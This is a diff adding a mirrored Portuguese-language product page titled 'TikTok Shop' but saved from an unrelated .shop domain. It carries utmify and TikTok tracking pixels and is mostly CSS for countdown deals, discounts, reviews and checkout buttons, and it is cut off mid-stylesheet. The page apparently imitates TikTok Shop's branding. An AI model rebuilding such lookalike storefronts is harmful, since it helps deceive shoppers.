@@ -1,0 +1,2952 @@
+<html lang="pt-BR"><script id="allow-copy_script" src="chrome-extension://aefehdhdciieocakfobpaaolhipkcpgc/content_scripts/copy.js"></script><!-- Mirrored from comprareletronicosshop.shop/produtos/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Nov 2025 23:10:07 GMT --><head>
+<!-- Google tag (gtag.js) -->
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.tikTokPixelId = "691e5d5ed301d51a2de0387b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js"></script>
+    <!-- Tailwind -->
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>TikTok Shop</title>
+
+    <link href="../../kitshop.shop/styles.css" rel="stylesheet">
+    <style>
+        /* TikTok Font Faces */
+        @font-face {
+            font-family: 'TikTokFont';
+            src: url('fonts/TikTokFont-Regular.woff2') format('woff2'),
+                url('fonts/TikTokFont-Regular.woff') format('woff'),
+                url('fonts/TikTokFont-Regular.otf') format('opentype');
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'TikTokFont';
+            src: url('fonts/TikTokFont-Semibold.woff2') format('woff2'),
+                url('fonts/TikTokFont-Semibold.woff') format('woff'),
+                url('fonts/TikTokFont-Semibold.otf') format('opentype');
+            font-weight: 600;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'TikTokFont';
+            src: url('fonts/TikTokFont-Bold.woff2') format('woff2'),
+                url('fonts/TikTokFont-Bold.woff') format('woff'),
+                url('fonts/TikTokFont-Bold.otf') format('opentype');
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'TikTokDisplayFont';
+            src: url('fonts/TikTokDisplayFont-Regular.woff2') format('woff2'),
+                url('fonts/TikTokDisplayFont-Regular.woff') format('woff'),
+                url('fonts/TikTokDisplayFont-Regular.otf') format('opentype');
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'TikTokDisplayFont';
+            src: url('fonts/TikTokDisplayFont-Semibold.woff2') format('woff2'),
+                url('fonts/TikTokDisplayFont-Semibold.woff') format('woff'),
+                url('fonts/TikTokDisplayFont-Semibold.otf') format('opentype');
+            font-weight: 600;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'TikTokDisplayFont';
+            src: url('fonts/TikTokDisplayFont-Bold.woff2') format('woff2'),
+                url('fonts/TikTokDisplayFont-Bold.woff') format('woff'),
+                url('fonts/TikTokDisplayFont-Bold.otf') format('opentype');
+            font-weight: 700;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'TikTokFont', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        .container {
+            max-width: 100vw;
+            background: white;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            background: white;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .header-left {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 20px;
+            font-size: 24px;
+        }
+
+        /* Product Image Section */
+        .product-images {
+            position: relative;
+            background: white;
+        }
+
+        .image-container {
+            position: relative;
+            width: 100%;
+            height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .product-main-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: opacity 0.3s ease-in-out;
+            background: #f8f9fa;
+            cursor: default;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+        .image-loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .image-loading.show {
+            display: block;
+        }
+
+        .image-counter {
+    position: absolute;
+    bottom: 16px;
+    right: 16px;
+    background: rgba(0, 0, 0, 0.6);
+    color: white;
+    padding: 2px 8px; /* Mais reduzido */
+    border-radius: 10px; /* Mais reduzido */
+    font-size: 11px; /* AINDA MENOR */
+    font-family: 'TikTokFont', sans-serif;
+}
+
+        .image-nav-buttons {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            transform: translateY(-50%);
+            display: flex;
+            justify-content: space-between;
+            padding: 0 12px;
+            pointer-events: none;
+        }
+
+        .nav-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: none;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            pointer-events: all;
+            transition: all 0.2s ease-in-out;
+            backdrop-filter: blur(4px);
+        }
+
+        .nav-btn:hover {
+            background: rgba(0, 0, 0, 0.7);
+            transform: scale(1.1);
+        }
+
+        .nav-btn:active {
+            transform: scale(0.95);
+        }
+
+        .nav-btn.disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .image-thumbnails {
+    display: none !important;
+}
+        .image-thumbnails::-webkit-scrollbar {
+            display: none;
+        }
+
+        .thumbnail {
+            flex-shrink: 0;
+            width: 60px;
+            height: 60px;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .thumbnail.active {
+            border-color: #00d4aa;
+            box-shadow: 0 0 0 1px rgba(0, 212, 170, 0.3);
+        }
+
+        .thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .thumbnail:hover {
+            transform: scale(1.05);
+        }
+
+        .image-dots {
+    display: none !important;
+}
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(0, 0, 0, 0.3);
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .dot.active {
+            background: #00d4aa;
+            transform: scale(1.2);
+        }
+
+        .dot:hover {
+            background: rgba(0, 212, 170, 0.7);
+        }
+
+        /* Price Section */
+        .price-section {
+            padding: 16px;
+            background: linear-gradient(90deg, #ff6b35 0%, #ff8c42 100%);
+            color: white;
+        }
+
+        .price-main {
+            font-family: 'TikTokDisplayFont', 'TikTokFont', sans-serif;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            line-height: 1.2;
+            white-space: nowrap;
+        }
+
+        .price-savings {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        .price-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .price-info {
+            flex: 1;
+        }
+
+        .flash-deal-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 6px;
+        }
+
+        .flash-deal-text {
+            font-family: 'TikTokFont', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 4px 12px;
+            border-radius: 16px;
+            backdrop-filter: blur(10px);
+        }
+
+        .countdown {
+            font-size: 16px;
+            font-weight: 700;
+            color: white;
+            text-align: right;
+        }
+
+        /* Discount Banner */
+        .discount-banner {
+            background: white;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .discount-content {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: nowrap;
+        }
+
+        .discount-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        .discount-text {
+            color: #ff6b6b;
+            font-size: 12px;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        /* Product Info */
+        .product-info {
+            padding: 16px;
+        }
+
+        .product-title {
+            font-family: 'TikTokDisplayFont', 'TikTokFont', sans-serif;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .rating-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .stars {
+            color: #ffc107;
+            font-size: 16px;
+        }
+
+        .rating-text {
+            color: #666;
+            font-size: 14px;
+        }
+
+        /* Shipping Info */
+        .shipping-info {
+            padding: 16px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .shipping-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+        }
+
+        .shipping-icon {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        .shipping-details {
+            flex: 1;
+        }
+        .product-main-image {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+}
+
+        .shipping-free {
+            color: #00d4aa;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .shipping-date {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .shipping-fee {
+            color: #999;
+            font-size: 14px;
+            text-decoration: line-through;
+        }
+
+        /* Flavor Selector */
+        .flavor-section {
+            padding: 0 16px 12px 16px;
+        }
+
+        .flavor-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+        }
+
+        .flavor-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .flavor-button {
+            border: 1px solid #e5e5e5;
+            border-radius: 12px;
+            padding: 6px 14px;
+            font-size: 13px;
+            font-weight: 500;
+            background: #fff;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .flavor-button.selected {
+            border-color: #ff2d55;
+            background: rgba(255, 45, 85, 0.08);
+            color: #ff2d55;
+        }
+
+        .flavor-button:focus-visible {
+            outline: 2px solid #ffabbc;
+            outline-offset: 2px;
+        }
+
+        .flavor-button.flavor-button-disabled {
+            color: #bbb;
+            background: #f5f5f5;
+            border-color: #e5e5e5;
+            cursor: not-allowed;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            background: white;
+            border-bottom: 1px solid #f0f0f0;
+            position: sticky;
+            top: 57px;
+            z-index: 99;
+        }
+
+        .tab {
+            font-family: 'TikTokFont', sans-serif;
+            flex: 1;
+            padding: 16px 8px;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            border-bottom: 2px solid transparent;
+            cursor: pointer;
+        }
+
+        .tab.active {
+            color: #333;
+            font-weight: 600;
+            border-bottom-color: #333;
+        }
+
+        /* Content Sections */
+        .content-section {
+            padding: 16px;
+            display: none;
+        }
+
+        .content-section.active {
+            display: block;
+        }
+
+        /* Options Section */
+        .options-section {
+            padding: 16px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .section-title {
+            font-family: 'TikTokFont', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .option-grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .option-item {
+            aspect-ratio: 1;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .option-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .option-item.available {
+            border-color: #00d4aa;
+            box-shadow: 0 0 0 2px rgba(0, 212, 170, 0.2);
+        }
+
+        .option-item.sold-out {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .option-item.sold-out img {
+            filter: grayscale(100%);
+        }
+
+        .sold-out-badge {
+            position: absolute;
+            bottom: 2px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ff2d55;
+            color: white;
+            font-size: 8px;
+            font-weight: 600;
+            padding: 2px 6px;
+            border-radius: 10px;
+            font-family: 'TikTokFont', sans-serif;
+        }
+
+        /* Reviews Section */
+        .reviews-section {
+            padding: 16px;
+        }
+
+        .reviews-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .reviews-title {
+            font-family: 'TikTokFont', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .reviews-rating {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .rating-big {
+            font-family: 'TikTokDisplayFont', sans-serif;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .review-item {
+    padding: 16px 0;
+    border-bottom: none; /* Remove a linha divisória */
+}
+
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .review-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #ddd;
+        }
+
+        .review-name {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .review-stars {
+            color: #ffc107;
+            font-size: 14px;
+            margin: 4px 0;
+        }
+
+        .review-variant {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 8px;
+        }
+
+        .review-text {
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 12px;
+        }
+
+        .review-images {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+        }
+
+        .review-image {
+            aspect-ratio: 1;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .review-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .review-image img:hover {
+            transform: scale(1.05);
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            border-top: 1px solid #f0f0f0;
+            display: flex;
+            padding: 12px 16px;
+            gap: 12px;
+            z-index: 100;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            font-size: 12px;
+            color: #666;
+            text-decoration: none;
+        }
+
+        .nav-icon {
+            width: 20px;
+            height: 20px;
+            color: #666;
+        }
+
+        .add-cart-btn {
+            font-family: 'TikTokFont', sans-serif;
+            flex: 1;
+            background: #f0f0f0;
+            color: #333;
+            border: none;
+            padding: 12px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .buy-btn {
+            font-family: 'TikTokFont', sans-serif;
+            flex: 1;
+            background: #ff2d55;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        body.modal-open {
+            overflow: hidden;
+        }
+
+        .flavor-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.55);
+            display: none;
+            align-items: flex-end;
+            justify-content: center;
+            padding: 16px;
+            z-index: 120;
+        }
+
+        .flavor-modal-overlay.is-visible {
+            display: flex;
+        }
+
+        .flavor-modal {
+            background: white;
+            border-radius: 24px 24px 12px 12px;
+            width: 100%;
+            max-width: 440px;
+            padding: 24px 24px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            position: relative;
+            transform: translateY(60px);
+            transition: transform 0.25s ease;
+        }
+
+        .flavor-modal-overlay.is-visible .flavor-modal {
+            transform: translateY(0);
+        }
+
+        .flavor-modal__close {
+            position: absolute;
+            top: 14px;
+            right: 14px;
+            border: none;
+            background: transparent;
+            font-size: 26px;
+            color: #555;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .flavor-modal__header {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+
+        .flavor-modal__header img {
+            width: 64px;
+            height: 64px;
+            border-radius: 12px;
+            object-fit: cover;
+            border: 1px solid #f0f0f0;
+        }
+
+        .flavor-modal__header-info {
+            flex: 1;
+        }
+
+        .flavor-modal__name {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .flavor-modal__price {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff2d55;
+            margin-bottom: 6px;
+        }
+
+        .flavor-modal__tag {
+            display: inline-block;
+            background: #00a650;
+            color: white;
+            font-size: 11px;
+            padding: 3px 8px;
+            border-radius: 999px;
+            font-weight: 600;
+        }
+
+        .flavor-modal__sizes {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+
+        .flavor-chip {
+            flex: 1 1 30%;
+            min-width: 100px;
+            border-radius: 16px;
+            border: 1px solid #ddd;
+            padding: 10px 12px;
+            text-align: center;
+            font-weight: 600;
+            color: #333;
+            background: white;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .flavor-chip.selected {
+            border-color: #ff2d55;
+            background: #ff2d55;
+            color: white;
+            box-shadow: 0 6px 20px rgba(255, 45, 85, 0.35);
+        }
+
+        .flavor-modal__cta {
+            display: block;
+            margin-top: 20px;
+            width: 100%;
+            text-align: center;
+            background: #ff2d55;
+            color: white;
+            padding: 14px;
+            border-radius: 16px;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        /* Footer Styles */
+        .footer {
+            background: white;
+            padding: 24px 16px;
+            border-top: 1px solid #f0f0f0;
+            margin-top: 40px;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-bottom: 24px;
+        }
+
+        .tiktok-shop-logo {
+            height: 32px;
+            width: auto;
+        }
+
+        .footer-sections {
+            margin-bottom: 24px;
+        }
+
+        .footer-section {
+            border-bottom: 1px solid #f0f0f0;
+            padding: 16px 0;
+        }
+
+        .footer-header {
+            font-family: 'TikTokFont', sans-serif;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .chevron {
+            color: #666;
+            font-size: 18px;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .footer-benefits {
+            display: flex;
+            gap: 24px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .benefit-icon {
+            width: 16px;
+            height: 16px;
+            flex-shrink: 0;
+        }
+
+        .footer-apps {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+
+        .app-download img {
+            height: 40px;
+            border-radius: 8px;
+        }
+
+        .footer-top-button {
+            display: flex;
+            justify-content: center;
+        }
+
+        .top-button {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 1px solid #ddd;
+            background: white;
+            color: #666;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .top-button:hover {
+            background: #f5f5f5;
+            transform: translateY(-2px);
+        }
+
+        /* Modal de tela cheia */
+        .fullscreen-modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            overflow: hidden;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fullscreen-modal.active {
+            opacity: 1;
+        }
+
+        .fullscreen-content {
+            max-width: 90%;
+            max-height: 90%;
+            position: relative;
+        }
+
+        .fullscreen-image {
+            max-width: 100%;
+            max-height: 90vh;
+            object-fit: contain;
+        }
+
+        .close-fullscreen {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 1001;
+        }
+
+        .nav-fullscreen {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 1001;
+            background: rgba(0, 0, 0, 0.5);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .prev-fullscreen {
+            left: 20px;
+        }
+
+        .next-fullscreen {
+            right: 20px;
+        }
+
+        .share-overlay,
+        .complaint-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none;
+            touch-action: none;
+        }
+
+        .share-overlay.active,
+        .complaint-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+            touch-action: none;
+        }
+
+        .share-section,
+        .complaint-section {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            border-radius: 20px 20px 0 0;
+            padding: 20px;
+            transform: translateY(100%);
+            transition: transform 0.3s ease-in-out;
+            z-index: 10001;
+            display: none;
+            pointer-events: auto;
+            touch-action: pan-y;
+        }
+
+        .share-section.active,
+        .complaint-section.active {
+            transform: translateY(0);
+        }
+
+        .share-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .complaint-header {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .share-title,
+        .complaint-title {
+            font-family: 'TikTokFont', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .share-close,
+        .complaint-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #666;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .share-options,
+        .complaint-options {
+            display: flex;
+            overflow-x: auto;
+            flex-wrap: nowrap;
+            scrollbar-width: none;
+            gap: 6px;
+            margin-bottom: 20px;
+        }
+
+        .share-option,
+        .complaint-option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            padding: 10px;
+            border-radius: 12px;
+            transition: background-color 0.2s;
+        }
+
+        .share-option:hover,
+        .complaint-option:hover {
+            background-color: #f8f9fa;
+        }
+
+        .share-icon,
+        .complaint-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: white;
+        }
+
+        .share-icon.whatsapp,
+        .complaint-icon.whatsapp {
+            background: #25D366;
+        }
+
+        .share-icon.instagram img {
+            transform: scale(2);
+        }
+
+        .share-icon.copy {
+            background: #1877F2;
+        }
+
+        .share-icon.facebook {
+            background: #1877F2;
+        }
+
+        .share-icon.twitter {
+            background: #1DA1F2;
+        }
+
+        .share-icon.telegram {
+            background: #0088cc;
+        }
+
+        .share-label {
+            font-family: 'TikTokFont', sans-serif;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        .share-cancel {
+            background: #f0f0f0;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-family: 'TikTokFont', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .share-cancel:hover {
+            background: #e0e0e0;
+        }
+
+        /* Mobile specific adjustments */
+        @media (max-width: 480px) {
+            .price-main {
+                font-size: 22px;
+            }
+
+            .price-main span {
+                font-size: 18px !important;
+            }
+
+            .discount-badge {
+                font-size: 11px;
+                padding: 3px 6px;
+            }
+
+            .discount-text {
+                font-size: 11px;
+            }
+
+            .product-title {
+                font-size: 16px;
+            }
+
+            .footer-benefits {
+                flex-direction: column;
+                gap: 16px;
+            }
+
+            .footer-apps {
+                flex-direction: column;
+            }
+        }
+
+        /* iPhone specific adjustments */
+        @media (max-width: 390px) {
+            .price-main {
+                font-size: 20px;
+            }
+
+            .price-main span {
+                font-size: 16px !important;
+                margin-right: 4px !important;
+            }
+
+            .discount-content {
+                gap: 6px;
+            }
+
+            .discount-badge {
+                font-size: 10px;
+                padding: 2px 5px;
+            }
+
+            .discount-text {
+                font-size: 10px;
+            }
+        }
+
+        .sticky-header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        #sticky-tabs {
+            transition: all 0.3s ease;
+        }
+        .product-main-image {
+            transition: transform 0.5s ease, opacity 0.5s ease;
+        }
+
+        .image-dragging {
+            opacity: 0.9;
+            transform: scale(0.95);
+        }
+
+        .swipe-indicator {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 24px;
+            color: rgba(255, 255, 255, 0.7);
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+        }
+
+        .swipe-indicator.left {
+            left: 15px;
+        }
+
+        .swipe-indicator.right {
+            right: 15px;
+        }
+
+        .swipe-indicator.visible {
+            opacity: 1;
+        }
+       #sticky-tabs {
+    display: none; /* Mantém escondido inicialmente */
+    position: sticky;
+    top: 57px;
+    z-index: 99;
+    background: white;
+    border-bottom: 1px solid #f0f0f0;
+}
+
+#sticky-tabs.visible {
+    opacity: 1;
+    transform: translateY(0);
+}
+
+.star-icon {
+    width: 14px;
+    height: 14px;
+    display: inline-block; /* Alterado de block para inline-block */
+    margin-right: -2px; /* Margem negativa para sobrepor */
+}
+
+.reviews-rating .star-icon {
+    width: 16px;
+    height: 16px;
+}
+
+.stars {
+    display: flex;
+    gap: 0px; /* Sem espaçamento entre as estrelas */
+}
+
+.divisoria-avaliacoes {
+    border-top: 1px solid #f0f0f0;
+    margin-top: 16px;
+    padding-top: 16px;
+    margin-left: -16px; /* Compensa o padding do container pai */
+    margin-right: -16px; /* Compensa o padding do container pai */
+    padding-left: 16px; /* Mantém o conteúdo alinhado */
+    padding-right: 16px; /* Mantém o conteúdo alinhado */
+}
+        /* 🔼 FIM DO NOVO CSS 🔼 */
+    </style>
+
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com 